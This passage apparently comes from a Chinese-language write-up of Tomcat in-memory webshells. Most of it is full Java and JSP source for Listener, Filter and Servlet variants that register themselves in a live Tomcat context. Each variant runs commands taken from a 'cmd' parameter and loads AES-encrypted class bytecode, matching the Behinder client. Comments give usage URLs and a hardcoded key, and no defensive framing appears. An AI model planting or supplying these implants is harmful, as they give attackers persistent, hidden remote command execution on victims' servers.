            TLbx myListener = new TLbx();

            standardContext.addApplicationEventListener(myListener);


        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        try {
            RequestFacade requestFacade = (RequestFacade) servletRequestEvent.getServletRequest();
            Field getRequestField = requestFacade.getClass().getDeclaredField("request");
            getRequestField.setAccessible(true);
            Request request = (Request) getRequestField.get(requestFacade);
            Response response = request.getResponse();
            HttpSession  session = request.getSession();
            Map<String, Object> pageContext = new HashMap<String, Object>();
            pageContext.put("session", session);
            pageContext.put("request", request);
            pageContext.put("response", response);

            String command = request.getParameter("cmd");
            if (command != null){
                String system = System.getProperty("os.name");
                if (system.toLowerCase().contains("win")) {
                    Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",command});
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    StringBuilder stringBuilder = new StringBuilder();
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        stringBuilder.append(line + '\n');
                    }

                    response.getOutputStream().write(stringBuilder.toString().getBytes());
                    response.getOutputStream().flush();
                    response.getOutputStream().close();
                } else {
                    Process process = Runtime.getRuntime().exec(new String[]{"bash","-c",command});
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    StringBuilder stringBuilder = new StringBuilder();
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        stringBuilder.append(line + '\n');
                    }

                    response.getOutputStream().write(stringBuilder.toString().getBytes());
                    response.getOutputStream().flush();
                    response.getOutputStream().close();
                }
            }
            ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();

            if (request.getMethod().equals("POST")) {
                if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    //从java.lang.ClassLoader中获取到Class对象
                    Class Lclass = cl.getClass().getSuperclass();
                    //调用RushThere()方法，注入内存马
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
    public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request,Map<String, Object> pageContext){
        byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
        try {

            Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            define.setAccessible(true);
            Class uclass = null;
            try {
                uclass = cl.loadClass("U");
            } catch (ClassNotFoundException e) {
                uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
            }
            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            Object u = constructor.newInstance(this.getClass().getClassLoader());
            Method Um = uclass.getDeclaredMethod("g", byte[].class);
            Um.setAccessible(true);
            String k = passwd;
            session.setAttribute("u", k);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
            byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
            Class eclass = (Class) Um.invoke(u, eClassBytes);
            Object a = eclass.newInstance();
            Method b = eclass.getDeclaredMethod("equals", Object.class);
            b.setAccessible(true);
            b.invoke(a, pageContext);
        }catch (Exception e){
            e.printStackTrace();
        }
    }


    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }


}

```
### 3.1.2、Filter
```
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

/**
 * 不用改了
 * 标准的cmd内存马&冰蝎马
 * 用法:
 *  1、执行命令：http://xxx.xxx.xxx.x/?cmd=whoami
 *  2、冰蝎连接：http://xxx.xxx.xxx.x/ 密码：lan
 *
 * 2023/08/03
 */
public class TFbx extends ClassLoader implements Filter{

    String passwd = "73f50c9f17291ce9";

    static {
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Filter myFilter = new TFbx();
            String filterName = "lan";


            FilterDef filterDef = new FilterDef();
            filterDef.setFilterName(filterName);
            filterDef.setFilterClass(myFilter.getClass().getName());
            filterDef.setFilter(myFilter);
            filterDef.setAsyncSupported("true");
            standardContext.addFilterDef(filterDef);

            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/");
            filterMap.setFilterName(filterName);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());
            standardContext.addFilterMap(filterMap);

            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

            Field filterConfigsField = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
            filterConfigsField.setAccessible(true);
            HashMap filterConfigs = (HashMap) filterConfigsField.get(standardContext);

            filterConfigs.put(filterName,filterConfig);


        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        String command = servletRequest.getParameter("cmd");
        if (command != null){
            String system = System.getProperty("os.name");
            if (system.toLowerCase().contains("win")) {
                Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",command});
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }

                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
            } else {
                Process process = Runtime.getRuntime().exec(new String[]{"bash","-c",command});
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }

                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
            }
        }

        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        HttpSession session = request.getSession();

        Map<String, Object> pageContext = new HashMap<String, Object>();
        pageContext.put("session", session);
        pageContext.put("request", request);
        pageContext.put("response", response);

        ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();

        if (request.getMethod().equals("POST")) {
            if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                //从java.lang.ClassLoader中获取到Class对象
                Class Lclass = cl.getClass().getSuperclass();
                //调用RushThere()方法，注入内存马
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            }
            filterChain.doFilter(servletRequest, servletResponse);
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }

    public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request,Map<String, Object> pageContext){
        byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
        try {

            Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            define.setAccessible(true);
            Class uclass = null;
            try {
                uclass = cl.loadClass("U");
            } catch (ClassNotFoundException e) {
                uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
            }
            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            Object u = constructor.newInstance(this.getClass().getClassLoader());
            Method Um = uclass.getDeclaredMethod("g", byte[].class);
            Um.setAccessible(true);
            String k = passwd;
            session.setAttribute("u", k);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
            byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
            Class eclass = (Class) Um.invoke(u, eClassBytes);
            Object a = eclass.newInstance();
            Method b = eclass.getDeclaredMethod("equals", Object.class);
            b.setAccessible(true);
            b.invoke(a, pageContext);
        }catch (Exception e){
            e.printStackTrace();
        }
    }




    @Override
    public void destroy() {

    }
}

```
### 3.1.3、Servlet
```
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

/**
 * 不用改了
 * 标准的cmd内存马&冰蝎马
 * 用法:
 *  1、执行命令：http://xxx.xxx.xxx.x/?cmd=whoami
 *  2、冰蝎连接：http://xxx.xxx.xxx.x/lan 密码：lan
 *
 * 2023/08/03
 */

public class TSbx implements Servlet {
    String passwd = "73f50c9f17291ce9";
    static {
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            TSbx myServlet = new TSbx();

            String name = myServlet.getClass().getSimpleName();

            Wrapper wrapper = standardContext.createWrapper();
            wrapper.setName(name);
            wrapper.setServlet(myServlet);

            standardContext.addChild(wrapper);
            standardContext.addServletMappingDecoded("/lan",name);


        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        String command = servletRequest.getParameter("cmd");
        if (command != null){
            String system = System.getProperty("os.name");
            if (system.toLowerCase().contains("win")) {
                Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",command});
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }

                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
            } else {
                Process process = Runtime.getRuntime().exec(new String[]{"bash","-c",command});
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }

                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
            }
        }

        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        HttpSession session = request.getSession();

        Map<String, Object> pageContext = new HashMap<String, Object>();
        pageContext.put("session", session);
        pageContext.put("request", request);
        pageContext.put("response", response);

        ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();

        if (request.getMethod().equals("POST")) {
            if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                //从java.lang.ClassLoader中获取到Class对象
                Class Lclass = cl.getClass().getSuperclass();
                //调用RushThere()方法，注入内存马
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            }
        }
    }

    public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request,Map<String, Object> pageContext){
        byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
        try {

            Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            define.setAccessible(true);
            Class uclass = null;
            try {
                uclass = cl.loadClass("U");
            } catch (ClassNotFoundException e) {
                uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
            }
            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            Object u = constructor.newInstance(this.getClass().getClassLoader());
            Method Um = uclass.getDeclaredMethod("g", byte[].class);
            Um.setAccessible(true);
            String k = passwd;
            session.setAttribute("u", k);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
            byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
            Class eclass = (Class) Um.invoke(u, eClassBytes);
            Object a = eclass.newInstance();
            Method b = eclass.getDeclaredMethod("equals", Object.class);
            b.setAccessible(true);
            b.invoke(a, pageContext);
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}


```
## 3.2、jsp源码
### 3.2.1、Listener
```
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@page language="java" contentType="text/html; charset=UTF-8" %>

<%--
/**
 * 不用改了
 * 标准的cmd内存马&冰蝎马
 * 用法:
 *  1、执行命令：http://xxx.xxx.xxx.x/?cmd=whoami
 *  2、冰蝎连接：http://xxx.xxx.xxx.x/ 密码：lan
 *
 * 2023/08/03
 */
--%>
<%
    class LanListener implements ServletRequestListener {

        String passwd = "73f50c9f17291ce9";

        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            try {
                RequestFacade requestFacade = (RequestFacade) sre.getServletRequest();
                Field getRequestField = requestFacade.getClass().getDeclaredField("request");
                getRequestField.setAccessible(true);
                Request request = (Request) getRequestField.get(requestFacade);
                Response response = request.getResponse();
                HttpSession  session = request.getSession();
                Map<String, Object> pageContext = new HashMap<String, Object>();
                pageContext.put("session", session);
                pageContext.put("request", request);
                pageContext.put("response", response);

                String command = request.getParameter("cmd");
                if (command != null){
                    String system = System.getProperty("os.name");
                    if (system.toLowerCase().contains("win")) {
                        Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",command});
                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                        StringBuilder stringBuilder = new StringBuilder();
                        String line;
                        while ((line = bufferedReader.readLine()) != null) {
                            stringBuilder.append(line + '\n');
                        }

                        response.getOutputStream().write(stringBuilder.toString().getBytes());
                        response.getOutputStream().flush();
                        response.getOutputStream().close();
                    } else {
                        Process process = Runtime.getRuntime().exec(new String[]{"bash","-c",command});
                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                        StringBuilder stringBuilder = new StringBuilder();
                        String line;
                        while ((line = bufferedReader.readLine()) != null) {
                            stringBuilder.append(line + '\n');
                        }

                        response.getOutputStream().write(stringBuilder.toString().getBytes());
                        response.getOutputStream().flush();
                        response.getOutputStream().close();
                    }
                }
                ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();

                if (request.getMethod().equals("POST")) {
                    if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                        Class Lclass = cl.getClass().getSuperclass();
                        RushThere(Lclass, cl, session, request, pageContext);
                    } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                        Class Lclass = cl.getClass().getSuperclass().getSuperclass();
                        RushThere(Lclass, cl, session, request, pageContext);
                    } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                        Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
                        RushThere(Lclass, cl, session, request, pageContext);
                    } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                        Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                        RushThere(Lclass, cl, session, request, pageContext);
                    } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                        Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                        RushThere(Lclass, cl, session, request, pageContext);
                    } else {
                        Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                        RushThere(Lclass, cl, session, request, pageContext);
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request,Map<String, Object> pageContext){
            byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
            try {

                Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                define.setAccessible(true);
                Class uclass = null;
                try {
                    uclass = cl.loadClass("U");
                } catch (ClassNotFoundException e) {
                    uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
                }
                Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
                constructor.setAccessible(true);
                Object u = constructor.newInstance(this.getClass().getClassLoader());
                Method Um = uclass.getDeclaredMethod("g", byte[].class);
                Um.setAccessible(true);
                String k = passwd;
                session.setAttribute("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                Class eclass = (Class) Um.invoke(u, eClassBytes);
                Object a = eclass.newInstance();
                Method b = eclass.getDeclaredMethod("equals", Object.class);
                b.setAccessible(true);
                b.invoke(a, pageContext);
            }catch (Exception e){
                e.printStackTrace();
            }
        }

        @Override
        public void requestDestroyed(ServletRequestEvent sre) {
        }
    }

    LanListener lanListener = new LanListener();
%>

<%
    RequestFacade requestFacade = (RequestFacade) request;
    Class requestFacadeClass = requestFacade.getClass();
    Field getRequestField = requestFacadeClass.getDeclaredField("request");
    getRequestField.setAccessible(true);
    Request getRequest = (Request) getRequestField.get(requestFacade);
    StandardContext standardContext = (StandardContext) getRequest.getContext();
    standardContext.addApplicationEventListener(lanListener);
%>

```
### 3.2.2、Filter
```
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@page language="java" contentType="text/html; charset=UTF-8" %>

<%--
/**
 * 不用改了
 * 标准的cmd内存马&冰蝎马
 * 用法:
 *  1、执行命令：http://xxx.xxx.xxx.x/?cmd=whoami
 *  2、冰蝎连接：http://xxx.xxx.xxx.x/ 密码：lan
 *
 * 2023/08/03
 */
--%>
<%
    class LanMyFilter implements Filter {

        String passwd = "73f50c9f17291ce9";

        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }

        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            String command = servletRequest.getParameter("cmd");
            if (command != null){
                String system = System.getProperty("os.name");
                if (system.toLowerCase().contains("win")) {
                    Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",command});
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    StringBuilder stringBuilder = new StringBuilder();
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        stringBuilder.append(line + '\n');
                    }

                    servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                    servletResponse.getOutputStream().flush();
                    servletResponse.getOutputStream().close();
                } else {
                    Process process = Runtime.getRuntime().exec(new String[]{"bash","-c",command});
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    StringBuilder stringBuilder = new StringBuilder();
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        stringBuilder.append(line + '\n');
                    }

                    servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                    servletResponse.getOutputStream().flush();
                    servletResponse.getOutputStream().close();
                }
            }

            HttpServletRequest request = (HttpServletRequest) servletRequest;
            HttpServletResponse response = (HttpServletResponse) servletResponse;
            HttpSession session = request.getSession();

            Map<String, Object> pageContext = new HashMap<String, Object>();
            pageContext.put("session", session);
            pageContext.put("request", request);
            pageContext.put("response", response);

            ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();

            if (request.getMethod().equals("POST")) {
                if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
